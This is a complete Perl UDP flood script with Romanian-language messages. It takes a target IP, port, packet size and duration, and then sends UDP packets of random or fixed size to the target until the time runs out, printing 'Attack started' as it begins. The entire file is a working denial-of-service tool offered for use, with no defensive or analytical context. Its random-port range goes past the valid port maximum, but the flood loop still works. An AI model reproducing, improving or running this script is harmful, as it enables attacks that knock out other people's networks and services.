#!/usr/bin/perl



 

use Socket;

use strict;



if ($#ARGV != 3) {

  printf "\033[1;34mAi gresit comanda bubble\033[1;34m\033[0m\n\n";

  exit(1);

}



my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Nu ma pot conecta la $ip\n";

$endtime = time() + ($time ? $time : 1000000);

socket(Bubble, PF_INET, SOCK_DGRAM, 17);

printf "\033[1;34mAttack started to $ip\033[1;34m\033[0m\n\n";

printf "\033[1;36mStai jos cumetre\033[1;36m\033[0m\n\n" unless $time;

for (;time() <= $endtime;) {

  $psize = $size ? $size : int(rand(1500-64)+64) ;

  $pport = $port ? $port : int(rand(1666635))+100;

 

  send(Bubble, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}